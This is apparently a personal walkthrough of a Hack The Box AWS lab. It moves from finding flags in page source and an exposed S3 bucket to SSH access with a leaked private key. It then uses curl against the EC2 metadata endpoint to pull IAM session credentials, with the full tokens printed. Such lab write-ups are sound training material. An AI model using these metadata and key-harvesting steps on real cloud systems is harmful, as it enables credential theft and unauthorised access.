Tags: #template 
Related to: #cloud, #aws , #pentest, #hacking 
Index: [[]] - index location 

#### Summary
AWS Pro Lab HTB Enterprise

#### Walkthrough

- nmap scan the target

![[Pasted image 20230714131657.png]]

- We see port 22 and 80 open

- Lets check 80

![[Pasted image 20230714131756.png]]

- A Simple company website.  Lets check source...

- We have the first flag in the source itself

![[Pasted image 20230714133229.png]]

- **Source Luke** Flag Captured 🚩 - **Sensitive information in client side source code**

- Going further down......

![[Pasted image 20230714132013.png]]

- Several references to an s3 bucket - https://logistics-assets-634262415781.s3.us-east-2.amazonaws.com

Lets try accessing the bucket directly. ==Ideally this shouldn't be accessible==

![[Pasted image 20230714132456.png]]

We have an **Exposed S3 Bucket** with a flag.txt file in it - This is our **Grand Leakage Flag** 🚩

Lets investigate further through the files listed here...

![[Pasted image 20230715065946.png]]

id_rsa --> Private key for ssh 

![[Pasted image 20230715070158.png]]

Copied it - saved it. Possible user name - webadmin

Attempted an ssh login with user web admin. Be sure to change permissions of id_rsa using chmod 400

![[Pasted image 20230715070422.png]]

![[Pasted image 20230715070612.png]]

We have the **Just a Teaser Flag** 🚩 due to **Sensitive files stored in Publicly accessibly s3 bucket**

Lets try hunting down some info

![[Pasted image 20230715071136.png]]

We have 2 std users ubuntu and webadmin
Then we have root user.

Lets inspect temp folder
![[Pasted image 20230715071424.png]]

This terraform .sh has global read write execute permissions on inspection it is empty

> Keep it noted i tried running a bash script... ideally it should be running a cron - or it could be a rabbit hole

==We need to find some credentials for CLI related tools to work. Must hunt them==

>Possible locations
~/.aws/credentials
~/.aws/config

Tried the instance metadata endpoint to gather info

``` sh
curl  http://169.254.169.254/latest/dynamic/instance-identity/document -v
*   Trying 169.254.169.254:80...
* TCP_NODELAY set
* Connected to 169.254.169.254 (169.254.169.254) port 80 (#0)
> GET /latest/dynamic/instance-identity/document HTTP/1.1
> Host: 169.254.169.254
> User-Agent: curl/7.68.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
* HTTP 1.0, assume close after body
< HTTP/1.0 200 OK
< Accept-Ranges: bytes
< Content-Length: 472
< Content-Type: text/plain
< Date: Wed, 19 Jul 2023 12:34:25 GMT
< Last-Modified: Fri, 09 Jun 2023 14:09:44 GMT
< Connection: close
< Server: EC2ws
< 
{
  "accountId" : "297018273754",
  "architecture" : "x86_64",
  "availabilityZone" : "us-east-2a",
  "billingProducts" : null,
  "devpayProductCodes" : null,
  "marketplaceProductCodes" : null,
  "imageId" : "ami-0128e8b118981dabe",
  "instanceId" : "i-0cb18e9fdfea74186",
  "instanceType" : "t2.small",
  "kernelId" : null,
  "pendingTime" : "2023-06-09T08:57:07Z",
  "privateIp" : "10.0.0.9",
  "ramdiskId" : null,
  "region" : "us-east-2",
  "version" : "2017-09-30"
* Closing connection 0
```


Refered this https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-categories.html

https://hackingthe.cloud/aws/general-knowledge/using_stolen_iam_credentials/

Tried this 
```sh
curl http://169.254.169.254/latest/meta-data/iam/info
```

Got 
![[Pasted image 20230721113938.png]]

```sh
curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance
```

```
{
  "Code" : "Success",
  "LastUpdated" : "2023-07-21T06:10:54Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "",
  "SecretAccessKey" : "",
  "Token" : "IQoJb3JpZ2luX2VjEC4aCXVzLWVhc3QtMiJHMEUCIQCtwdvrtpUFYSBYKE+/mdi55/JnFSUP/Zh1Dx2kTwEPDAIgDLbw9k2ZBF2fQYPAduEVCzUVDaGFMBm4J9J8T+sgxV0q0AQIt///////////ARAAGgwyOTcwMTgyNzM3NTQiDH8FOWF5pjRrsvErQiqkBC+a1Fa4SL5RqjdjlSIQQL9F32n9PNWsCsgDRWE2Tlrvs6MloU5QP91rabjz0niKFVeWeHSlHvy6+PcgP8VEueiuJxhPr6Q5gBdFg6v4XuViYKGgec+1vgjiRvdICpPJD3SZz71CzVaeCxfDJOGE/T0hTpAWsFAKqUABJQdGaskDcCJyQBkbkrhHcF13xNJhj5HMHNrT49e+ucuLV+exn1429eUemIB5NXbWm2us2CEAxztX/SALa+qh56i7fajH2ld4LUhX+IK73Ucq284ATdD0VQuqD1TyJCzUDCMKRB2CHY8Q0jsGpPjgbKQWmK0ai3UkC3cEE27sn9G90ECt+iqwE8O6/5TPmikxOUs+SWWPDTzeEnXlOByb1MITpM76gElWjFh+NvyE4ujINzftULrdfxORVShJ69pNUN0VxRuPuyV+2VNfH8NvkQ+639M6Qg+2o80b3KrdkbTUtF4C3eq7aOslF0VDDmLCN9LcGIC8mbTRLQKaspyK5PycROS6VAHqRBgBR17CXt32mqB5OiQH2B43RFK3b4VU10cFT2wqtCfURXpDrgga4rYioy6W0RG1eT8SXxz4ILPgXcs0WGjH+/rLHYirn9WvYP6KHoUx4gfwVbfovmpQOvceGqd+fImHRJNJAIkh29jKDIBxjX4Osw97FV8JsFlGYADlehPfGz9dn84wUH3+D2OrVbFOx5imAwvEeUz8d0LxhET1infoF217MJnD6KUGOpMCefuzusd4ZcuradGAn6Uu+69HCoL1NjEQBMq8h7VxjkpcQ4sHMpo0W8IJ7eN7SY2iS5zcpTUAsv4Db3GdKO6vcb5jkzpI4bRbO2U/KvcC7LXbMrEaqYSgrGnwFgaS+r2KpFIFBy0EvpgIol69iP2fglNS+bvgH4zCnwbleiJMZMmz0N97R0azp8ZbF3Kh4ewqgEVqRJXCEVL6a0HnnBtxN3YRywtu0ZHSQRzOFbitnXuqmo8pvBidVz31oz/cNsHvYkumF+ZwOQ2OhbRAj91abblyv8yaCsdF6zTW5fCOyGJiLtzXaK/Nv/dPOrPYEsVki0ETvvFWv0L7EJFYpMNdtXh9wbtKepQTUfPuSxNAkFOoUj0=",
  "Expiration" : "2023-07-21T12:31:04Z"
* Closing connection 0
}
```

```sh
curl -v http://169.254.169.254/latest/meta-data/iam/security-credentials/web01 -v
```

```sh
*   Trying 169.254.169.254:80...
* TCP_NODELAY set
* Connected to 169.254.169.254 (169.254.169.254) port 80 (#0)
> GET /latest/meta-data/iam/security-credentials/web01 HTTP/1.1
> Host: 169.254.169.254
> User-Agent: curl/7.68.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
* HTTP 1.0, assume close after body
< HTTP/1.0 200 OK
< Accept-Ranges: bytes
< Content-Length: 1578
< Content-Type: text/plain
< Date: Fri, 21 Jul 2023 06:34:15 GMT
< Last-Modified: Fri, 21 Jul 2023 06:11:37 GMT
< Connection: close
< Server: EC2ws
< 
{
  "Code" : "Success",
  "LastUpdated" : "2023-07-21T06:11:45Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIAUKJ5LF7NN37KRS6L",
  "SecretAccessKey" : "",
  "Token" : "IQoJb3JpZ2luX2VjEC4aCXVzLWVhc3QtMiJHMEUCIG/S39HEDd2ZCgyP6Kw4UEKzgINlqBzBdW9QykIiXc6/AiEAy5kUUSlQhtaNDzk9iCpf5DRNoC63VdYhGw2QQFOER0kqwQUIt///////////ARAAGgwyOTcwMTgyNzM3NTQiDMHUiMDCFmDaCgcx2CqVBax5pi2edO1lIKROF7qzKjg0sWuqzXC6UtL5ce6ZFPpKRiAtQ5wzcineGc5mBsn4CnTbxW8AslcqSjIE2KYObnyCcXOiPUfgsTdKHRHt0WGqqWgtibbpY+cV9A85o8wQHGHQ/BGCkV9yugl5r2G12UyPWSBP9G/mk3Y+GVzp7alXGCYSDkPd+vIxh4RnPyU8uAkorE+8H2TU90AKpj8/SSEcTW9micE5jaoncSOP8AeqP8/1P1usYsSPXFL0DLwa3UXpyxL+Y8soEkkmtUP+2HoWKDkUe7nwOe0Axput7d9DVsmN5hrpfd+MLGy6iSFEFbAvC5I6pz9vSBIF+o7J/1dHndH4Ssf2w/8uq/WrQFabDMdF+aPxk5WqQgtBly15sthsqzTK0szhJg9f/VORwaVEuTWg28+6sl9jMnEZOo0/8IfhXvvt7TPD16eBHeQMDr3/Bz9/5Whm8vTSwv7hDircDE1eTZwr4obqmGGbb7nw2M21v+41XmtTRdAwxnxxzMgagD0pFpbBAe1E7h613lDyMUaMTEZ3YdgEtSCBVBnIG/nsRGq6awDpSjAyQCF/dt+OIlSFeVIAiCOxfe2L5A59KuyzH5f9kqww62CjyxtWxN3foycT/70bj0lODj9GA0keexwTw/Ls5TcDDSQZqXnSxWXqicM9JzDX5CZjhIEIGWjqdsBxy2uY6fytciFCUpBajkQig1p4bwuSepsFSt5jesEm6ChDCB9wjnTZx93Om29PXDckz/wSJDOHvins7UVF6aU2vMPtu2cLsIS3h4akulKyycSu6uV9IUhyL9eNEb0Alm2btT2CNuuZoXwFb+c0Cega/hyynrXmJm0opL8kkBd16vA2iUGznrhtR6FvuJln6oQwmcPopQY6sQFe+IXQoVoof5UUWeKJnJlmSZHiTwwNipi0FeEgyyeeY+O+FdihVNMNXcTO8bCfC+Hbkxb8KEXo7CQMLwh1xkydSLqVKTalBO6UpC6OCUHGOqdvBm7D3i6rACxFCEe0e1PV4l25yaRmLlwQvDb+2oGs1HciAQrX51aooz1ktLiIWF3dDp3M9FxQzZwbfMk/IHGSqMPONwfg5RjQaxHuMc770HYEAC0UkK8tRXx8D0E7Tz0=",
  "Expiration" : "2023-07-21T12:22:59Z"
* Closing connection 0
```


```
└──╼ [★]$ aws sts get-access-key-info --access-key-id=ASIAUKJ5LF7NN37KRS6L  --profile whoismbm
{
    "Account": "297018273754"
}
┌─[13]─[10.8.0.55]─[whoismbm@htb-tlsmqnyf6t]─[~]
└──╼ [★]$ aws sts get-access-key-info --access-key-id=ASIAUKJ5LF7NLSYTOYEI  --profile whoismbm
{
    "Account": "297018273754"
}
┌─[1

```
###### References  (optional )